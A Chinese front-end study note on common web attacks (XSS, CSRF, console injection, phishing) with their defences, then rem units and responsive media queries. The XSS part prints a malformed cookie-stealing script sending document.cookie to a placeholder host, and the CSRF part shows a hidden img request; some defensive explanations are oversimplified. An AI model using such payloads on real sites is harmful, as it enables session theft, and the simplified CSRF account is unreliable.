### 1.web常见网络攻击

### XSS攻击

场景：恶意攻击者小t发现了某网站有一个没有添加XSS防御机制的留言功能，小t直接在漏洞位置（一般是`input`框）添加了以下代码:

```html
<script>
  <script type="text/javascript">document.write("<img src='http://xxx.xxx.xxx?c=" + escape(document.cookie) + "'>")</script>
</script>
```

留言一发布，这张图片就会暴露在留言板中。其他好奇宝宝一进入，自己的token就随着这个`img`标签发送到恶意服务器中了！

解决方案：

将所有请求数据进行敏感内容过滤。如：`<script>` `/?^*()`等等。要注意的是，我们应尽量使用成熟的转义库，因为我们单靠自己无法想出所有可能情况。（如大小写、html自带的容错机制、**利用过滤后的语句再次构成攻击**等）

并且，xss攻击的预防一般是在**后端**进行处理，绕过前端验证的方法太过简单！

### CSRF攻击

场景：小 t 在浏览一个常用的站点，突然发现站点顶部出现了一个弹框：“您的电脑存在高危漏洞！请及时修复！”小明点击之后发现自己来到了一个空白页，没过多久，发现自己常用的帐号已经被盗取了！

原理：原名**跨站请求伪造**，站点的登录信息一般都是存储在**cookie**中，之后的每个请求，都会将**cookie**携带。**第三方恶意站点**会把请求链接隐藏在一些隐蔽的或充满引导性的按钮中，用户一旦点击，**就会携带上包含了个人信息或登录信息的cookie跳转到恶意站点**，恶意站点就拥有了你的登录权限。

如：

```html
由于<img>标签的跨域特性，可以无视同源策略
<img style="width:0;" src="http://csrf.com"   />
```

因为**同源策略**的保护，CSRF攻击一般会跳转第三方站点中，这样更方便操控攻击，但是也可能是因为网站存在高危漏洞而发生在同源站点中！

解决方法1

直接拦截用户第三方链接跳转：在用户通过链接跳转站外时进行拦截，提醒用户是否是主动跳转，并提示用户恶意站点。

解决方法2：

[**CSRF Token**](https://stackoverflow.com/questions/5207160/what-is-a-csrf-token-what-is-its-importance-and-how-does-it-work)

1. 在用户进入站点时随机生成一个 CSRF Token（不同于信息token，而且不保存在cookie中），传递给用户并保存在服务器 session 中

2. 在相关链接的中（如在query中）添加该 CSRF Token

   `GET https:**//xxx.com?csrftoken=random**`

3. 服务器接收用户请求，先对比 CSRF Token，再验证cookie信息

由于恶意站点无法对操作原站点的信息，以这样双重验证的形式，一明一暗，确保用户信息安全。

### 控制台注入

场景：诱骗不懂技术的小白在控制台输入了恶意代码

解决方法：只需要在在控制台中添加提示文字即可。

### 钓鱼

场景：通过一些谣言或非官方信息，将用户引导至**官方高仿站点**，输入用户名和密码等信息。

解决方法：无…只能靠用户自己的意识了！

## rem原理

由于移动端屏幕大小不定的原因，使用 px 布局，会出现小屏显示不全，大屏显示太小的情况，这对用户体验是重大打击！所以就需要用到 rem 布局

rem是css中的一个单位。它并非一个固定值，它的大小由根元素（html标签）的`font-size`决定。如：根元素的`font-size:20px`,那么 1rem === 20px。

根据rem的这种特性，我们就可以**通过屏幕大小动态改变根元素的`font-size`值**，再使用rem布局来适应不同屏幕的不同大小问题。

另外提一嘴：em指的是当前元素的，rem指根元素（ r : root）。

那么一般如何设置 font-size 呢？

JavaScript版：

使用 js 获取屏幕宽度，设置根元素`font-size`

```
function calRootFontSize() {
		const html = document.documentElement;
    html.style.fontSize = html.getBoundingClientRect().width / 20 + 'px';
}
```

CSS版

巧妙地使用vw（可视宽度）单位，按照vw的百分比来配置。

```
html{
		font-size: 5.333333333vw; // 以iphone6为准
}

```

## 响应式优缺点以及实现

**优点：**

1. 能够自动适配不同屏幕尺寸，实现跨平台
2. 移动端和PC端可以给出友好的统一的布局界面
3. 减少了开发和运维的成本

**缺点：**

1. 由于移动端和PC端加载的是同一份资源，所以对移动端来说，增加了消耗（低分辨率的移动端加载了大于它显示能力的图片）
2. 增加了多余的加载（如移动端加载了PC端的CSS文件）
3. 代码太过庞大，某端的改动可能影响到其他界面的显示
4. 不支持 IE6/7/8 

**实现：**

最为常用的就是使用 CSS 的 `MediaQuery`

bootstrap栅格布局使用的`mediaQuery`

```
/* 超小屏幕（手机，小于 768px） */
/* 没有任何媒体查询相关的代码，因为这在 Bootstrap 中是默认的（还记得 Bootstrap 是移动设备优先的吗？） */

/* 小屏幕（平板，大于等于 768px） */
@media (min-width: @screen-sm-min) { ... }

/* 中等屏幕（桌面显示器，大于等于 992px） */
@media (min-width: @screen-md-min) { ... }

/* 大屏幕（大桌面显示器，大于等于 1200px） */
@media (min-width: @screen-lg-min) { ... }
```



